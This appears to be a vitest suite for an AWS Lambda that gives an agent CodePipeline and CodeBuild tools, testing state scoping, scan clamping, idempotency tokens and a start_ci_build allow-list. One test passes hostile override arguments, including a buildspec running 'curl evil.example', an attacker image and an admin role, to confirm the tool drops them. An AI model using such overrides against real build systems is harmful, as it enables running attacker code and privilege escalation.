/**
 * TEAM-3822 — pipeline-tools Lambda regression suite (first test file for this
 * Lambda).
 *
 * Drives the REAL `handler` export with the three AWS SDK clients mocked at the
 * module seam (same vi.mock + vi.hoisted shape as
 * lambda/orchestrator/agent-invoker-retry.test.mjs), so the execution-scoped
 * get_state race fix, the get_build_status scan clamp, and the start_deploy
 * idempotency token are all exercised end-to-end with no AWS and no
 * credentials.
 *
 * Pinned defects:
 *  1. get_state computed terminal/succeeded from ALL stageStates, so right
 *     after start_deploy a poll could read the PREVIOUS execution's all-green
 *     stages as the new run's completion. Now: execution_id scopes the
 *     computation and matchesExecution:false forces terminal:false.
 *  2. get_build_status's `Math.min(Number(args.scan) || 15, 50)` let a negative
 *     scan invert ids.slice(0, n) into a from-end slice (dropping the NEWEST
 *     builds). Now: integer clamp to [1, 50], non-numeric → 15.
 *  3. start_deploy sent no clientRequestToken, so a retried tool call
 *     double-triggered the pipeline. Now: commit_sha derives a charset/length-
 *     valid token; no sha → token OMITTED (never empty/invalid).
 *  4. (TEAM-3871) Scoped get_state declared terminal:true when only a PREFIX
 *     of stages had reached the new execution (Source done, Build not started),
 *     and stale action statuses from the previous run bled into the scoped
 *     verdict. Now: terminal requires a whole-pipeline disposition (all stages
 *     match, or a matching stage Failed/Stopped), scoped status is stage-level
 *     only, and execution_id is String()-coerced.
 *
 * TEAM-4122 FR-4 adds start_ci_build + capabilities. Those tests assert the
 * SHAPE OF THE REQUEST, not just the answer: the StartBuild input is deep-equal
 * to a three-key allow-list, because every defect this tool could have is a key
 * that reached CodeBuild — an override that replaces the buildspec, or a project
 * name that came from an agent's args instead of from env.
 */
import { describe, it, expect, vi, beforeEach } from "vitest";

const h = vi.hoisted(() => ({
  state: {
    cpCalls: [], // { type, input } for every CodePipeline command sent
    cbCalls: [], // { type, input } for every CodeBuild command sent
    getPipelineStateImpl: async () => ({ stageStates: [] }),
    listActionExecutionsImpl: async () => ({ actionExecutionDetails: [] }),
    startPipelineExecutionImpl: async () => ({ pipelineExecutionId: "exec-new" }),
    listBuildsImpl: async () => ({ ids: [] }),
    startBuildImpl: async () => ({
      build: {
        id: "agentcore-hub-ci:11111111-2222-3333-4444-555555555555",
        arn: "arn:aws:codebuild:us-east-1:111122223333:build/agentcore-hub-ci:11111111",
        buildStatus: "IN_PROGRESS",
        resolvedSourceVersion: undefined,
      },
    }),
    batchGetBuildsImpl: async (input) => ({
      builds: (input.ids || []).map((id) => ({
        id,
        buildStatus: "SUCCEEDED",
        resolvedSourceVersion: `sha-${id}`,
        sourceVersion: `pr/${id}`,
        endTime: "2026-01-01T00:00:00Z",
      })),
    }),
  },
}));

vi.mock("@aws-sdk/client-codepipeline", () => ({
  CodePipelineClient: class {
    async send(cmd) {
      const type = cmd?.__type;
      h.state.cpCalls.push({ type, input: cmd.input });
      if (type === "GetPipelineState") return h.state.getPipelineStateImpl(cmd.input);
      if (type === "ListActionExecutions") return h.state.listActionExecutionsImpl(cmd.input);
      if (type === "StartPipelineExecution") return h.state.startPipelineExecutionImpl(cmd.input);
      return {};
    }
  },
  GetPipelineStateCommand: class { constructor(i) { this.input = i; this.__type = "GetPipelineState"; } },
  StartPipelineExecutionCommand: class { constructor(i) { this.input = i; this.__type = "StartPipelineExecution"; } },
  ListActionExecutionsCommand: class { constructor(i) { this.input = i; this.__type = "ListActionExecutions"; } },
}));

vi.mock("@aws-sdk/client-codebuild", () => ({
  CodeBuildClient: class {
    async send(cmd) {
      const type = cmd?.__type;
      h.state.cbCalls.push({ type, input: cmd.input });
      if (type === "ListBuildsForProject") return h.state.listBuildsImpl(cmd.input);
      if (type === "BatchGetBuilds") return h.state.batchGetBuildsImpl(cmd.input);
      if (type === "StartBuild") return h.state.startBuildImpl(cmd.input);
      return {};
    }
  },
  ListBuildsForProjectCommand: class { constructor(i) { this.input = i; this.__type = "ListBuildsForProject"; } },
  BatchGetBuildsCommand: class { constructor(i) { this.input = i; this.__type = "BatchGetBuilds"; } },
  StartBuildCommand: class { constructor(i) { this.input = i; this.__type = "StartBuild"; } },
}));

vi.mock("@aws-sdk/client-cloudwatch-logs", () => ({
  CloudWatchLogsClient: class {
    async send() { return { events: [] }; }
  },
  GetLogEventsCommand: class { constructor(i) { this.input = i; } },
}));

const { handler, validateCiProjectName } = await import("./index.mjs");

/** The hoisted default BatchGetBuilds stub, so a suite that installs its own can
 * be restored between tests. */
const DEFAULT_BATCH_GET = h.state.batchGetBuildsImpl;

/** Invoke the handler the way the runtime's _invoke_lambda does and parse the
 * jsonResult text payload back into an object. */
async function invoke(tool, args = {}) {
  const res = await handler({ name: `Pipeline___${tool}`, arguments: args });
  return JSON.parse(res.content[0].text);
}

/** A GetPipelineState response where every stage is green and belongs to
 * `executionId`. */
function allGreenStages(executionId) {
  return {
    stageStates: ["Source", "Build", "Deploy"].map((stageName) => ({
      stageName,
      latestExecution: { status: "Succeeded", pipelineExecutionId: executionId },
      actionStates: [
        {
          actionName: `${stageName}_action`,
          latestExecution: { status: "Succeeded" },
        },
      ],
    })),
  };
}

/** Invoke a specific handler instance (see withEnv) the same way. */
async function invokeOn(handlerFn, tool, args = {}) {
  const res = await handlerFn({ name: `Pipeline___${tool}`, arguments: args });
  return JSON.parse(res.content[0].text);
}

/**
 * Re-import index.mjs with `env` applied, for the values it reads ONCE at module
 * load (CI_PROJECT and its validation verdict). The AWS mocks are re-created by
 * vitest but still close over this file's `h`, so calls land in h.state as usual.
 * Env and the module registry are both restored afterwards, so the top-level
 * `handler` other suites use is untouched.
 */
async function withEnv(env, fn) {
  const saved = Object.fromEntries(Object.keys(env).map((k) => [k, process.env[k]]));
  for (const [k, v] of Object.entries(env)) {
    if (v === undefined) delete process.env[k];
    else process.env[k] = v;
  }
  vi.resetModules();
  try {
    const mod = await import("./index.mjs");
    return await fn(mod);
  } finally {
    for (const [k, v] of Object.entries(saved)) {
      if (v === undefined) delete process.env[k];
      else process.env[k] = v;
    }
    vi.resetModules();
  }
}

const DEFAULT_START_BUILD = () => ({
  build: {
    id: "agentcore-hub-ci:11111111-2222-3333-4444-555555555555",
    arn: "arn:aws:codebuild:us-east-1:111122223333:build/agentcore-hub-ci:11111111",
    buildStatus: "IN_PROGRESS",
  },
});

beforeEach(() => {
  h.state.cpCalls = [];
  h.state.cbCalls = [];
  h.state.getPipelineStateImpl = async () => ({ stageStates: [] });
  h.state.listActionExecutionsImpl = async () => ({ actionExecutionDetails: [] });
  h.state.startPipelineExecutionImpl = async () => ({ pipelineExecutionId: "exec-new" });
  h.state.listBuildsImpl = async () => ({ ids: [] });
  h.state.batchGetBuildsImpl = DEFAULT_BATCH_GET;
  h.state.startBuildImpl = async () => DEFAULT_START_BUILD();
  delete process.env.PIPELINE_CI_START_BUILD;
});

// ─── 1. Execution-scoped get_state ───────────────────────────────────────────

describe("get_state execution scoping (the post-start_deploy race)", () => {
  it("does NOT report the OLD run's all-green stages as terminal for a NEW execution_id", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("OLD");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(false);
    expect(out.terminal).not.toBe(true);
    expect(out.succeeded).not.toBe(true);
  });

  it("matchesExecution:true + terminal:false while a matching stage is InProgress", async () => {
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Source",
          latestExecution: { status: "InProgress", pipelineExecutionId: "NEW" },
          actionStates: [
            { actionName: "GitHub_main", latestExecution: { status: "InProgress" } },
          ],
        },
        {
          stageName: "Build",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "OLD" },
          actionStates: [
            { actionName: "Build_and_gate", latestExecution: { status: "Succeeded" } },
          ],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
  });

  it("matchesExecution:true + terminal/succeeded once the matching stages are all green", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("NEW");

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(true);
    expect(out.succeeded).toBe(true);
    expect(out.failed).toBe(false);
  });

  it("scopes failure detection to the matching execution only", async () => {
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Source",
          latestExecution: { status: "Failed", pipelineExecutionId: "OLD" },
          actionStates: [],
        },
        {
          stageName: "Build",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "NEW" },
          actionStates: [],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    // The OLD run's failure must not bleed into the NEW run's verdict — but a
    // partial match with no matching failure is NOT terminal either (TEAM-3871:
    // terminal requires the WHOLE pipeline to have a disposition for this run).
    expect(out.matchesExecution).toBe(true);
    expect(out.failed).toBe(false);
    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
  });

  // ── TEAM-3871 regressions ──────────────────────────────────────────────────

  it("a prefix of stages Succeeded on NEW + later stages still on OLD → terminal:false (transition window)", async () => {
    // The Source→Build handoff window: Source already flipped to NEW and
    // Succeeded, but Build/Deploy still show the OLD run. Nothing is
    // InProgress, yet the NEW run is provably NOT done — Build hasn't started.
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Source",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "NEW" },
          actionStates: [
            { actionName: "GitHub_main", latestExecution: { status: "Succeeded" } },
          ],
        },
        {
          stageName: "Build",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "OLD" },
          actionStates: [
            { actionName: "Build_and_gate", latestExecution: { status: "Succeeded" } },
          ],
        },
        {
          stageName: "Deploy",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "OLD" },
          actionStates: [
            { actionName: "Deploy_action", latestExecution: { status: "Succeeded" } },
          ],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
    expect(out.failed).toBe(false);
  });

  it("a matching stage Failed → terminal:true + failed:true even with later stages still on OLD", async () => {
    // A failure disposition on the requested execution IS terminal — the run
    // will never advance past the failed stage, so waiting for the remaining
    // stages to "catch up" would poll forever.
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Source",
          latestExecution: { status: "Failed", pipelineExecutionId: "NEW" },
          actionStates: [],
        },
        {
          stageName: "Build",
          latestExecution: { status: "Succeeded", pipelineExecutionId: "OLD" },
          actionStates: [],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(true);
    expect(out.failed).toBe(true);
    expect(out.succeeded).toBe(false);
  });

  it("stale Failed action inside a matching InProgress stage does NOT mark the run failed", async () => {
    // actionStates carry no execution id: a lingering Failed action from the
    // PREVIOUS run can sit inside a stage whose latestExecution already matches
    // the NEW id. Scoped status must come from the STAGE level only.
    h.state.getPipelineStateImpl = async () => ({
      stageStates: [
        {
          stageName: "Build",
          latestExecution: { status: "InProgress", pipelineExecutionId: "NEW" },
          actionStates: [
            { actionName: "Build_and_gate", latestExecution: { status: "Failed" } },
          ],
        },
      ],
    });

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.failed).toBe(false);
    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
  });

  it("stale InProgress action inside all-green matching stages does NOT block terminal on the scoped path", async () => {
    h.state.getPipelineStateImpl = async () => {
      const state = allGreenStages("NEW");
      state.stageStates[1].actionStates.push({
        actionName: "stale_leftover",
        latestExecution: { status: "InProgress" },
      });
      return state;
    };

    const out = await invoke("get_state", { execution_id: "NEW" });

    expect(out.matchesExecution).toBe(true);
    expect(out.terminal).toBe(true);
    expect(out.succeeded).toBe(true);
    expect(out.failed).toBe(false);
  });

  it("a numeric execution_id does not throw and behaves like its string form", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("123");

    const asNumber = await invoke("get_state", { execution_id: 123 });
    const asString = await invoke("get_state", { execution_id: "123" });

    expect(asNumber.matchesExecution).toBe(true);
    expect(asNumber.terminal).toBe(true);
    expect(asNumber.succeeded).toBe(true);
    expect(asNumber).toEqual(asString);
  });

  it("back-compat: omitted execution_id keeps today's unscoped behavior", async () => {
    h.state.getPipelineStateImpl = async () => allGreenStages("OLD");

    const out = await invoke("get_state", {});

    expect(out.terminal).toBe(true);
    expect(out.succeeded).toBe(true);
    expect(out.failed).toBe(false);
    // matchesExecution is an execution-scoped concept — absent without the arg.
    expect(out).not.toHaveProperty("matchesExecution");
  });

  it("back-compat: omitted execution_id still honors ACTION-level statuses", async () => {
    // The unscoped path keeps its pre-TEAM-3871 behavior byte-for-byte: an
    // InProgress or Failed action counts even when the stage status disagrees.
    h.state.getPipelineStateImpl = async () => {
      const state = allGreenStages("OLD");
      state.stageStates[1].actionStates.push({
        actionName: "lagging_action",
        latestExecution: { status: "InProgress" },
      });
      return state;
    };

    const out = await invoke("get_state", {});

    expect(out.terminal).toBe(false);
    expect(out.succeeded).toBe(false);
  });
});

// ─── 2. get_build_status scan clamping ───────────────────────────────────────

describe("get_build_status scan clamping", () => {
  const twenty = Array.from({ length: 20 }, (_, i) => `build-${i}`); // newest first

  beforeEach(() => {
    h.state.listBuildsImpl = async () => ({ ids: [...twenty] });
  });

  /** Returns the ids get_build_status actually looked up via BatchGetBuilds. */
  async function scannedIds(scan) {
    h.state.cbCalls = [];
    await invoke("get_build_status", { scan });
    const batch = h.state.cbCalls.find((c) => c.type === "BatchGetBuilds");
    return batch ? batch.input.ids : [];
  }

  it("negative scan clamps to 1 (never a from-end slice dropping the newest builds)", async () => {
    const ids = await scannedIds(-5);
    expect(ids).toEqual(["build-0"]); // the NEWEST build, not the 15 oldest
    expect(ids.length).toBe(1);
  });

  it("scan 0 clamps to 1 (never an empty scan)", async () => {
    const ids = await scannedIds(0);
    expect(ids).toEqual(["build-0"]);
  });

  it("oversized scan clamps to 50", async () => {
    h.state.listBuildsImpl = async () => ({
      ids: Array.from({ length: 60 }, (_, i) => `build-${i}`),
    });
    const ids = await scannedIds(999);
    expect(ids.length).toBe(50);
    expect(ids[0]).toBe("build-0");
    expect(ids[49]).toBe("build-49");
  });

  it("non-numeric scan falls back to the default 15", async () => {
    const ids = await scannedIds("abc");
    expect(ids.length).toBe(15);
    expect(ids[0]).toBe("build-0");
  });

  it("in-range scan is honored as-is (back-compat)", async () => {
    const ids = await scannedIds(3);
    expect(ids).toEqual(["build-0", "build-1", "build-2"]);
  });
});

// ─── 3. start_deploy idempotency token ───────────────────────────────────────

describe("start_deploy clientRequestToken idempotency", () => {
  function startCall() {
    return h.state.cpCalls.find((c) => c.type === "StartPipelineExecution");
  }

  it("derives a charset/length-valid token from commit_sha", async () => {
    const out = await invoke("start_deploy", { commit_sha: "abc123def" });

    const call = startCall();
    expect(call).toBeDefined();
    const token = call.input.clientRequestToken;
    expect(token).toMatch(/^[a-zA-Z0-9-]+$/);
    expect(token.length).toBeGreaterThanOrEqual(1);
    expect(token.length).toBeLessThanOrEqual(128);
    expect(token).toContain("abc123def");
    expect(out.started).toBe(true);
    expect(out.pipelineExecutionId).toBe("exec-new");
  });

  it("sanitizes a dirty sha to the allowed charset", async () => {
    await invoke("start_deploy", { commit_sha: "abc/123+z" });

    const token = startCall().input.clientRequestToken;
    expect(token).toMatch(/^[a-zA-Z0-9-]+$/);
    expect(token).toContain("abc123z");
  });

  it("clamps the token to 128 chars", async () => {
    await invoke("start_deploy", { commit_sha: "a".repeat(500) });

    const token = startCall().input.clientRequestToken;
    expect(token).toMatch(/^[a-zA-Z0-9-]+$/);
    expect(token.length).toBe(128);
  });

  it("OMITS clientRequestToken entirely when no commit_sha is given", async () => {
    await invoke("start_deploy", {});

    const call = startCall();
    expect(call).toBeDefined();
    expect(call.input).not.toHaveProperty("clientRequestToken");
  });

  it("OMITS clientRequestToken when the sanitized sha is empty (never sends an invalid token)", async () => {
    await invoke("start_deploy", { commit_sha: "///+++" });

    expect(startCall().input).not.toHaveProperty("clientRequestToken");
  });
});

// ─── 4. start_ci_build (TEAM-4122 FR-4) ──────────────────────────────────────

describe("start_ci_build request shape (the allow-list)", () => {
  const SHA = "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4"; // 40-hex

  function startBuildCall() {
    return h.state.cbCalls.find((c) => c.type === "StartBuild");
  }

  it("sends EXACTLY {projectName, sourceVersion, idempotencyToken} — no fourth key", async () => {
    const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: "pr/12" });

    // Deep-equal, not toMatchObject: an extra key IS the defect.
    expect(startBuildCall().input).toEqual({
      projectName: "agentcore-hub-ci",
      sourceVersion: "pr/12",
      idempotencyToken: `ci-${SHA}`,
    });
    expect(out.ok).toBe(true);
    expect(out.started).toBe(true);
    expect(out.project).toBe("agentcore-hub-ci");
    expect(out.buildId).toBe("agentcore-hub-ci:11111111-2222-3333-4444-555555555555");
  });

  it("ignores args.project — the project is env, never a caller argument", async () => {
    await invoke("start_ci_build", {
      commit_sha: SHA,
      project: "agentcore-hub-deploy",
      projectName: "agentcore-hub-deploy",
    });

    expect(startBuildCall().input.projectName).toBe("agentcore-hub-ci");
  });

  it("drops every CodeBuild *Override key an agent could pass", async () => {
    await invoke("start_ci_build", {
      commit_sha: SHA,
      buildspecOverride: "version: 0.2\nphases:\n  build:\n    commands:\n      - curl evil.example",
      environmentVariablesOverride: [{ name: "AWS_PROFILE", value: "prod" }],
      imageOverride: "public.ecr.aws/attacker/img:latest",
      privilegedModeOverride: true,
      serviceRoleOverride: "arn:aws:iam::111122223333:role/admin",
      sourceTypeOverride: "NO_SOURCE",
      sourceLocationOverride: "https://example.invalid/repo",
      idempotencyToken: "attacker-chosen",
    });

    const input = startBuildCall().input;
    expect(Object.keys(input).sort()).toEqual([
      "idempotencyToken",
      "projectName",
      "sourceVersion",
    ]);
    // Not even the token is caller-controlled — it is derived from the sha, which
    // is what makes a retried call idempotent.
    expect(input.idempotencyToken).toBe(`ci-${SHA}`);
  });

  it("clamps the idempotency token to 64 chars", async () => {
    await invoke("start_ci_build", { commit_sha: SHA });
    expect(startBuildCall().input.idempotencyToken.length).toBeLessThanOrEqual(64);
  });

  it("defaults sourceVersion to the commit sha", async () => {
    await invoke("start_ci_build", { commit_sha: SHA });
    expect(startBuildCall().input.sourceVersion).toBe(SHA);
  });

  it("lowercases an upper-case sha (one commit is one dedupe key)", async () => {
    await invoke("start_ci_build", { commit_sha: SHA.toUpperCase() });
    expect(startBuildCall().input.idempotencyToken).toBe(`ci-${SHA}`);
    expect(startBuildCall().input.sourceVersion).toBe(SHA);
  });
});

describe("start_ci_build input validation", () => {
  const SHA = "0949f9d";

  it("missing commit_sha → missing_commit_sha, and NO SDK call at all", async () => {
    const out = await invoke("start_ci_build", { source_version: "pr/12" });

    expect(out).toMatchObject({ ok: false, reason: "missing_commit_sha" });
    expect(h.state.cbCalls).toEqual([]);
  });

  it("a non-sha commit_sha → invalid_commit_sha, no SDK call", async () => {
    for (const bad of ["main", "0949f9", "zzzzzzz", "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4c5", "12345 67"]) {
      h.state.cbCalls = [];
      const out = await invoke("start_ci_build", { commit_sha: bad });
      expect(out.reason, bad).toBe("invalid_commit_sha");
      expect(h.state.cbCalls, bad).toEqual([]);
    }
  });

  it("rejects the source_version shapes that can resolve to something else", async () => {
    for (const bad of [
      "refs/pull/1/head", // a ref, not a branch — resolves via the remote's namespace
      "refs/heads/main",
      "a..b",             // a range
      "*",                // a wildcard
      "-startsWithDash",
      `${"b".repeat(201)}`,
    ]) {
      h.state.cbCalls = [];
      const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: bad });
      expect(out, bad).toMatchObject({ ok: false, reason: "invalid_source_version" });
      expect(h.state.cbCalls, bad).toEqual([]);
    }
  });

  it("accepts pr/<n>, a 40-hex sha, and a plain branch name", async () => {
    for (const good of [
      "pr/1",
      "pr/1234567",
      "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4",
      "feature/TEAM-4122-backend-dev",
      "main",
      // Not a PR number, so it is read as a BRANCH named "pr/…" — a legal branch
      // name that simply may not exist. CodeBuild's own InvalidInputException is
      // the right place for "no such ref", not a shape rule that would also
      // reject someone's real `pr/hotfix` branch.
      "pr/12345678",
      "pr/abc",
    ]) {
      h.state.cbCalls = [];
      const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: good });
      expect(out, good).toMatchObject({ ok: true, started: true });
      expect(h.state.cbCalls.find((c) => c.type === "StartBuild").input.sourceVersion).toBe(good);
    }
  });

  it("an invalid CI_PROJECT disables the tool — refused, with NO SDK call", async () => {
    // The whole point of F2/F3: if config points CI at a deploy project, the tool
    // must refuse rather than start it.
    for (const bad of ["agentcore-hub-deploy", "agentcore-hub-build", "agentcore-hub-runtime-image-deploy", "agentcore-hub-*", "a"]) {
      h.state.cbCalls = [];
      await withEnv({ CI_PROJECT: bad }, async ({ handler: h2 }) => {
        const out = await invokeOn(h2, "start_ci_build", { commit_sha: SHA });
        expect(out, bad).toMatchObject({ ok: false, reason: "ci_project_invalid" });
        expect(out.detail, bad).toBeTruthy();
      });
      expect(h.state.cbCalls, bad).toEqual([]);
    }
  });

  it("the read-only tools keep working when CI_PROJECT is invalid (no cold-start crash)", async () => {
    await withEnv({ CI_PROJECT: "agentcore-hub-deploy" }, async ({ handler: h2 }) => {
      h.state.getPipelineStateImpl = async () => allGreenStages("OLD");
      const out = await invokeOn(h2, "get_state", {});
      expect(out.configured).toBe(true);
    });
  });
});

describe("start_ci_build dedupe (one build per commit)", () => {
  const SHA = "0949f9d8814aa3e2b1c4d5f6a7b8c9d0e1f2a3b4";

  /** A project whose recent builds are exactly `rows` (newest first). */
  function recentBuilds(rows) {
    h.state.listBuildsImpl = async () => ({ ids: rows.map((r) => r.id) });
    h.state.batchGetBuildsImpl = async (input) => ({
      // Returned in a DIFFERENT order than requested on purpose: BatchGetBuilds
      // makes no ordering promise, so "newest" must come from the id list.
      builds: [...rows].reverse().filter((r) => input.ids.includes(r.id)),
    });
  }

  it("an IN_PROGRESS build for the same commit is reused — no second StartBuild", async () => {
    recentBuilds([
      { id: "b-2", buildStatus: "IN_PROGRESS", resolvedSourceVersion: SHA },
      { id: "b-1", buildStatus: "FAILED", resolvedSourceVersion: "deadbeefdeadbeefdeadbeefdeadbeefdeadbeef" },
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({
      ok: true,
      reused: true,
      buildId: "b-2",
      buildStatus: "IN_PROGRESS",
      resolvedSourceVersion: SHA,
      project: "agentcore-hub-ci",
    });
    expect(out.started).toBeUndefined();
    expect(h.state.cbCalls.find((c) => c.type === "StartBuild")).toBeUndefined();
  });

  it("a SUCCEEDED build for the same commit is reused too (CI already proved this head)", async () => {
    recentBuilds([{ id: "b-9", buildStatus: "SUCCEEDED", resolvedSourceVersion: SHA }]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({ ok: true, reused: true, buildId: "b-9" });
    expect(h.state.cbCalls.find((c) => c.type === "StartBuild")).toBeUndefined();
  });

  it("a short commit_sha matches a full resolvedSourceVersion by prefix", async () => {
    recentBuilds([{ id: "b-3", buildStatus: "IN_PROGRESS", resolvedSourceVersion: SHA }]);

    const out = await invoke("start_ci_build", { commit_sha: "0949F9D" });

    expect(out).toMatchObject({ reused: true, buildId: "b-3" });
  });

  it("a FAILED build for the same commit is NOT a reuse — re-running red CI is the use case", async () => {
    recentBuilds([{ id: "b-4", buildStatus: "FAILED", resolvedSourceVersion: SHA }]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({ ok: true, started: true });
    expect(h.state.cbCalls.find((c) => c.type === "StartBuild")).toBeDefined();
  });

  it("a build for a DIFFERENT commit never dedupes this one", async () => {
    recentBuilds([
      { id: "b-5", buildStatus: "IN_PROGRESS", resolvedSourceVersion: "1111111111111111111111111111111111111111" },
      { id: "b-6", buildStatus: "SUCCEEDED", resolvedSourceVersion: null },
      // A non-hex resolvedSourceVersion (a branch) must not prefix-match a sha.
      { id: "b-7", buildStatus: "SUCCEEDED", resolvedSourceVersion: "main" },
    ]);

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({ ok: true, started: true });
  });

  it("scans the 30 most recent builds only", async () => {
    recentBuilds(
      Array.from({ length: 60 }, (_, i) => ({
        id: `b-${i}`,
        buildStatus: "SUCCEEDED",
        resolvedSourceVersion: `2222222222222222222222222222222222222${String(i).padStart(3, "0")}`,
      }))
    );

    await invoke("start_ci_build", { commit_sha: SHA });

    const batch = h.state.cbCalls.find((c) => c.type === "BatchGetBuilds");
    expect(batch.input.ids.length).toBe(30);
    expect(batch.input.ids[0]).toBe("b-0");
  });
});

describe("start_ci_build error mapping (a denial is an answer, not a crash)", () => {
  const SHA = "0949f9d";

  function throwing(name, message = name) {
    return async () => {
      const err = new Error(message);
      err.name = name;
      throw err;
    };
  }

  it("AccessDenied → start_build_not_granted, structured, no throw", async () => {
    h.state.startBuildImpl = throwing("AccessDeniedException", "not authorized to perform: codebuild:StartBuild");

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({
      ok: false,
      reason: "start_build_not_granted",
      project: "agentcore-hub-ci",
    });
    // The IAM message itself is not echoed — only the actionable remediation.
    expect(out.detail).toContain("PIPELINE_CI_START_BUILD=1");
  });

  it("ResourceNotFound → project_not_found", async () => {
    h.state.startBuildImpl = throwing("ResourceNotFoundException");

    const out = await invoke("start_ci_build", { commit_sha: SHA });

    expect(out).toMatchObject({ ok: false, reason: "project_not_found", project: "agentcore-hub-ci" });
  });

  it("InvalidInput → invalid_source_version (CodeBuild refused a shape we allowed)", async () => {
    h.state.startBuildImpl = throwing("InvalidInputException", "Unable to resolve version: pr/999");

    const out = await invoke("start_ci_build", { commit_sha: SHA, source_version: "pr/999" });

    expect(out).toMatchObject({
      ok: false,
      reason: "invalid_source_version",
      sourceVersion: "pr/999",
    });
  });

  it("an unexpected error falls through to the generic handler error path", async () => {
    h.state.startBuildImpl = throwing("ThrottlingException", "Rate exceeded");

    const res = await handler({
      name: "Pipeline___start_ci_build",
      arguments: { commit_sha: SHA },
    });

    // textResult, not jsonResult — the agent sees a retryable error, not ok:false.
    expect(res.content[0].text).toContain("ThrottlingException");
    expect(res.content[0].text).toContain("Rate exceeded");
  });
});

// ─── 5. capabilities (TEAM-4122 FR-4) ────────────────────────────────────────

describe("capabilities", () => {
  it("startCiBuild:true only when PIPELINE_CI_START_BUILD=1", async () => {
    process.env.PIPELINE_CI_START_BUILD = "1";
    expect((await invoke("capabilities")).startCiBuild).toBe(true);

    for (const value of [undefined, "0", "", "true", "yes", "1 "]) {
      if (value === undefined) delete process.env.PIPELINE_CI_START_BUILD;
      else process.env.PIPELINE_CI_START_BUILD = value;
      expect((await invoke("capabilities")).startCiBuild, String(value)).toBe(false);
    }
  });

  it("startCiBuild:false when CI_PROJECT is invalid EVEN WITH the flag on", async () => {
    await withEnv(
      { CI_PROJECT: "agentcore-hub-deploy", PIPELINE_CI_START_BUILD: "1" },
      async ({ handler: h2 }) => {
        const out = await invokeOn(h2, "capabilities");
        expect(out.startCiBuild).toBe(false);
        expect(out.ciProject).toBe("agentcore-hub-deploy");
      }
    );
  });

  it("approveDeploy is an unconditional false, flag or no flag", async () => {
    process.env.PIPELINE_CI_START_BUILD = "1";
    expect((await invoke("capabilities")).approveDeploy).toBe(false);
    delete process.env.PIPELINE_CI_START_BUILD;
    expect((await invoke("capabilities")).approveDeploy).toBe(false);
  });

  it("reports the projects it is wired to, and its version", async () => {
    const out = await invoke("capabilities");

    expect(out).toMatchObject({
      ciProject: "agentcore-hub-ci",
      buildProject: "agentcore-hub-build",
      deployPipeline: "agentcore-hub-deploy",
      version: 2,
    });
    // Read-only: capabilities never talks to AWS.
    expect(h.state.cpCalls).toEqual([]);
    expect(h.state.cbCalls).toEqual([]);
  });

  it("the unknown-tool message lists both new tools", async () => {
    const res = await handler({ name: "Pipeline___approve_deploy", arguments: {} });
    expect(res.error).toContain("start_ci_build");
    expect(res.error).toContain("capabilities");
    expect(res.error).not.toContain("PutApprovalResult");
  });
});

// ─── 6. validateCiProjectName, directly ──────────────────────────────────────

describe("validateCiProjectName", () => {
  it("accepts an ordinary PR-check project name", () => {
    const out = validateCiProjectName("agentcore-hub-ci", {
      buildProject: "agentcore-hub-build",
      deployProject: "agentcore-hub-deploy",
      pipelineName: "agentcore-hub-deploy",
    });
    expect(out).toEqual({ ok: true, reason: null });
  });

  it("names a reason for every refusal (the tool surfaces it as `detail`)", () => {
    const opts = {
      buildProject: "agentcore-hub-build",
      deployProject: "agentcore-hub-deploy",
      pipelineName: "agentcore-hub-deploy",
    };
    for (const bad of ["", "*", "ci-*", "ci?", "a", "-ci", "ci build", "agentcore-hub-build", "agentcore-hub-deploy", "agentcore-hub-runtime-image-deploy", null, undefined, 7]) {
      const out = validateCiProjectName(bad, opts);
      expect(out.ok, String(bad)).toBe(false);
      expect(typeof out.reason, String(bad)).toBe("string");
      expect(out.reason.length, String(bad)).toBeGreaterThan(0);
    }
  });
});
